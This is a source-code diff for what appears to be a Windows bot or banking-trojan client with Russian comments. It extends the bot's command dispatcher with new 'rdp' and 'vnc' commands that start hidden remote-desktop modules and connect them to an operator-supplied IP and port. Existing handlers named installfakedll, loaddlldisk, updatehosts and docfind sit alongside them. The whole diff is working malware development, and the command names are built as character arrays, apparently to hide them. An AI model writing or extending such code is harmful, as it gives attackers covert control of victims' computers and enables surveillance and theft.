@@ -1016,20 +1016,74 @@ bool ExecuteInstallFakeDll(void* Manager, PCHAR Command, PCHAR Args)
 }
 //----------------------------------------------------------------------------
 
+static bool IP_Downtime( const char* args, char* ip, int& port, int& downtime )
+{
+	char* p = STR::Scan( args, ' ' );
+	int lenAddr = p ? p - args : m_lstrlen(args);
+	if( lenAddr >= 24 ) return false;
+	int lenIP = lenAddr;
+	p = STR::Scan( args, ':' );
+	if( p )
+	{
+		lenIP = p - args;
+		port = m_atoi(p + 1);
+	}
+	else
+		port = 0;
+	m_memcpy( ip, args, lenIP );
+	ip[lenIP] = 0;
+	downtime = m_atoi(args + lenAddr);
+	if( downtime == 0 )
+		downtime = 24 * 60; //по умолчанию в режиме простоя сутки
+	return true;
+}
+
 //команда на подключение к видео серверу, просто шлем лог, его отсылка активизирует подключение к серверу
 bool ExecuteRS(void* Manager, PCHAR Command, PCHAR Args)
 {
 	char ip[24];
-	char* p = STR::Scan( Args, ' ' );
-	int lenIP = p ? p - Args : m_lstrlen(Args);
-	if( lenIP >= sizeof(ip) - 1 ) return false;
-	m_memcpy( ip, Args, lenIP );
-	ip[lenIP] = 0;
-	int downtime = p ? m_atoi(p + 1) : 0;
-	if( downtime == 0 )
-		downtime = 24 * 60; //по умолчанию в режиме простоя сутки
-	TASKDBG("RS", "ip: %s, downtime %d", ip, downtime);
-	VideoProcess::Init( TVideoRecDLL::RunCallback, ip, 0, downtime );
+	int downtime, port;
+	if( !IP_Downtime( Args, ip, port, downtime ) ) return false;
+	TASKDBG("RS", "ip: %s, port: %d, downtime %d", ip, port, downtime);
+	VideoProcess::Init( TVideoRecDLL::RunCallback, ip, port, downtime );
+	return true;
+}
+
+//загружает и запускает RDP.DLL
+bool ExecuteRDP(void* Manager, PCHAR Command, PCHAR Args)
+{
+	char ip[24];
+	int downtime, port;
+	if( !IP_Downtime( Args, ip, port, downtime ) ) return false;
+	TASKDBG("RDR", "ip: %s, port: %d, downtime %d", ip, port, downtime);
+	HANDLE mutex = TryCreateSingleInstance("RDP");
+	if( mutex ) //длл не запущена, запускаем
+	{
+		pCloseHandle(mutex);
+		MegaJump(VideoProcess::ProcessRDP);
+	}
+	else
+		TASKDBG( "RDR", "RDP уже запущен" );
+	VideoProcess::Init( TVideoRecDLL::RunCallback, ip, port, downtime );
+	return true;
+}
+
+//загружает и запускает VNC.EXE
+bool ExecuteVNC(void* Manager, PCHAR Command, PCHAR Args)
+{
+	char ip[24];
+	int downtime, port;
+	if( !IP_Downtime( Args, ip, port, downtime ) ) return false;
+	TASKDBG("VNC", "ip: %s, port: %d, downtime %d", ip, port, downtime);
+	HANDLE mutex = TryCreateSingleInstance("VNC");
+	if( mutex ) //vnc не запущена, запускаем
+	{
+		pCloseHandle(mutex);
+		MegaJump(VideoProcess::ProcessVNC);
+	}
+	else
+		TASKDBG( "VNC", "VNC уже запущен" );
+	VideoProcess::Init( TVideoRecDLL::RunCallback, ip, port, downtime );
 	return true;
 }
 
@@ -1148,8 +1202,10 @@ TCommandMethod GetCommandMethod(PTASKMANAGER Manager, PCHAR  Command)
 	const static char CommandLoadDLLDisk[]	 = {'l','o','a','d','d','l','l','d','i','s','k', 0};
 	const static char CommandDocFind[]		 = {'d','o','c','f','i','n','d', 0};
 	const static char CommandRS[]			 = {'r','s', 0};
+	const static char CommandRDP[]			 = {'r','d', 'p', 0};
+	const static char CommandVNC[]			 = {'v','n', 'c', 0};
 
-	int Index = StrIndexOf( Command, false, 9,
+	int Index = StrIndexOf( Command, false, 11,
 							(PCHAR)CommandUpdate,
 							(PCHAR)CommandUpdateConfig,
 							(PCHAR)CommandDownload,
@@ -1158,7 +1214,9 @@ TCommandMethod GetCommandMethod(PTASKMANAGER Manager, PCHAR  Command)
 							(PCHAR)CommandUpdateHosts,
 							(PCHAR)CommandLoadDLLDisk,
 							(PCHAR)CommandDocFind,
-							(PCHAR)CommandRS
+							(PCHAR)CommandRS,
+							(PCHAR)CommandRDP,
+							(PCHAR)CommandVNC
 						  );
 
 
@@ -1173,6 +1231,8 @@ TCommandMethod GetCommandMethod(PTASKMANAGER Manager, PCHAR  Command)
 		case 6: return ExecuteLoadDLLDisk;
 		case 7: return ExecuteDocFind;
 		case 8: return ExecuteRS;
+		case 9: return ExecuteRDP;
+		case 10: return ExecuteVNC;
 
     default: ;
 	}
